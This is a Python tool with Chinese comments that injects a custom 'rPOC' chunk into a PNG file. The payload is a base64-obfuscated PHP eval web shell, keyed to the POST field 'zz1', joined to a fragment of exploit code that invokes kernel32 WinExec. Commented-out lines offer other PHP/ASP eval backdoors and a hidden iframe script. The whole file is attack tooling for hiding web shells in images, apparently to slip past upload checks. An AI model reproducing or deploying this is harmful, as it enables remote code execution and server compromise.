
import struct
import zlib
import sys


PNG_SIGNATURE = b'\x89PNG\r\n\x1a\n'


def create_chunk(chunk_type: bytes, data: bytes) -> bytes:
    """创建PNG chunk"""
    length = struct.pack(">I", len(data))
    crc = zlib.crc32(chunk_type + data) & 0xffffffff
    crc_bytes = struct.pack(">I", crc)

    return length + chunk_type + data + crc_bytes


def find_ihdr_end(png_data: bytes) -> int:
    """
    找到 IHDR chunk 结束位置
    """
    offset = 8  # skip PNG signature

    length = struct.unpack(">I", png_data[offset:offset+4])[0]
    chunk_type = png_data[offset+4:offset+8]

    if chunk_type != b'IHDR':
        raise ValueError("Invalid PNG: IHDR not found")

    return offset + 8 + length + 4


def inject_chunk(input_file, output_file, chunk_type, payload):
    with open(input_file, "rb") as f:
        png = f.read()

    if not png.startswith(PNG_SIGNATURE):
        raise ValueError("Not a valid PNG file")

    ihdr_end = find_ihdr_end(png)

    chunk = create_chunk(chunk_type.encode(), payload.encode())

    new_png = png[:ihdr_end] + chunk + png[ihdr_end:]

    with open(output_file, "wb") as f:
        f.write(new_png)

    print("Chunk injected successfully!")
    print("Chunk type:", chunk_type)
    print("Payload size:", len(payload))


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Invalid arguments", sys.argv)
        print("Usage:")
        print("python png_inject.py input.png output.png chunk_type payload")
        sys.exit(1)

    input_file = sys.argv[1]
    output_file = sys.argv[2]
    chunk_type = "rPOC"  # 4-character chunk type, e.g., "rAwI"
    # payload = '<%eval request("if (isset($_POST["zz1"])) {eval(stripslashes($_POST["zz1"]));}")%>;'
    payload1 = "/.*/e.eval(base64_decode('aWYgKGlzc2V0KCRfUE9TVFsienoxIl0pKSB7ZXZhbChzdHJpcHNsYXNoZXMoJF9QT1NUWyJ6ejEiXSkpO30='));"
    # payload = "<?php eval(@$_POST['a']); ?>"
    # payload = """
    # <!-- INICIO - PUBLICIDAD POP-UP UNDER -->
    # <IFRAME SRC="http://www.ciudad.com.ar/ar/popunder/p_submit.asp?site=personales.ciudad.com.ar" width=1 height=1></IFRAME>
    # <SCRIPT LANGUAGE="JavaScript">
    # //<!--
    # for (var i=1; i<15; i++){
    # setTimeout('self.focus();',i*30);
    # }
    # //-->
    # </SCRIPT>
    # <!-- FIN - PUBLICIDAD POP-UP UNDER -->
    # """
    payload = """
    function trigger_exec(obj_addr, command_address, leaked_stack_ptr, kernel32_winexec_export) {
    rewrite(make_variant(0x81, leak_lower + 96, 0) + make_variant(0, obj_addr.lower + 2 * (pad_size), 0) + generate_context(command_address, leaked_stack_ptr, kernel32_winexec_export))
    write_debug("[*] About to trigger...")
    """
    payload = payload + payload1
    if len(chunk_type) != 4:
        raise ValueError("Chunk type must be 4 characters")

    inject_chunk(input_file, output_file, chunk_type, payload)

